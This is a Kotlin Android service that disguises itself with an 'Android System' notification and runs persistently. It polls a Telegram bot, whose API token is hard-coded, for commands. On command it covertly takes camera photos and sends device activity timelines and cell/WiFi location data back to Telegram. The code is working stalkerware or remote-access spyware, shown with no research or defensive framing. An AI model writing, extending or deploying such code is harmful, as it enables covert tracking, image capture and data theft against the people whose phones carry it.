package com.example.safetrack

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import androidx.lifecycle.LifecycleService
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Build
import android.os.IBinder
import androidx.core.app.NotificationCompat
import android.util.Log
import kotlinx.coroutines.*
import org.json.JSONObject
import java.net.HttpURLConnection
import java.net.URL

class PersistentSyncService : LifecycleService() {

    private val serviceScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private var lastUpdateId = -1L

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        super.onStartCommand(intent, flags, startId)
        startForeground(1, createNotification())
        startPolling()
        return START_STICKY
    }

    private fun startPolling() {
        serviceScope.launch(Dispatchers.IO) {
            while (isActive) {
                try {
                    val botToken = "8961320031:AAGWyCdW9CziarfEF8p3ynltYOsMWUirxNw"
                    val urlString = "https://api.telegram.org/bot$botToken/getUpdates?offset=${lastUpdateId + 1}"

                    val url = URL(urlString)
                    val connection = url.openConnection() as HttpURLConnection
                    connection.connectTimeout = 10000
                    connection.readTimeout = 10000

                    val response = connection.inputStream.bufferedReader().use { it.readText() }
                    connection.disconnect()

                    val json = JSONObject(response)
                    var delayTime = 2000L

                    if (json.getBoolean("ok")) {
                        val updates = json.getJSONArray("result")
                        var maxUpdateId = lastUpdateId
                        for (i in 0 until updates.length()) {
                            val update = updates.getJSONObject(i)
                            val currentUpdateId = update.getLong("update_id")
                            if (currentUpdateId > maxUpdateId) {
                                maxUpdateId = currentUpdateId
                            }
                            if (update.has("message")) {
                                val message = update.getJSONObject("message")
                                if (message.has("text")) {
                                    val text = message.getString("text")
                                    when (text) {
                                        "/photo" -> {
                                            serviceScope.launch {
                                                try {
                                                    val photoFile = CameraUtility.capturePhoto(this@PersistentSyncService)
                                                    TelegramSyncHelper.sendLogData("📷 *Photo Captured:* ${photoFile.absolutePath}")
                                                } catch (e: Exception) {
                                                    Log.e("PersistentSyncService", "Camera error", e)
                                                    TelegramSyncHelper.sendLogData("❌ *Camera Error:* ${e.message}")
                                                }
                                            }
                                        }
                                        "/p" -> {
                                            val timeline = ActivityTimelineUtility.generateActivityTimeline(this@PersistentSyncService, 12)
                                            TelegramSyncHelper.sendDebugLog(this@PersistentSyncService, "0", "0", "📊 *Device Activity Log:*\n\n$timeline")
                                        }
                                        "/cell" -> {
                                            val cellData = NetworkLocationUtility.getNetworkLocationInfo(this@PersistentSyncService)
                                            TelegramSyncHelper.sendDebugLog(this@PersistentSyncService, "0", "0", "📡 *Cell/WiFi Diagnostic:*\n\n$cellData")
                                        }
                                    }
                                }
                            }
                        }
                        lastUpdateId = maxUpdateId
                    }
                    delay(delayTime)
                } catch (e: Exception) {
                    Log.e("PersistentSyncService", "Polling error", e)
                    delay(5000)
                }
            }
        }
    }

    private fun createNotification(): Notification {
        val channelId = "sync_service_channel"
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                channelId, "System Sync", NotificationManager.IMPORTANCE_LOW
            )
            val manager = getSystemService(NotificationManager::class.java)
            manager.createNotificationChannel(channel)
        }
        return NotificationCompat.Builder(this, channelId)
            .setContentTitle("Android System")
            .setContentText("Syncing device state...")
            .setSmallIcon(android.R.drawable.stat_notify_sync)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .build()
    }

    override fun onBind(intent: Intent): IBinder? {
        super.onBind(intent)
        return null
    }
}
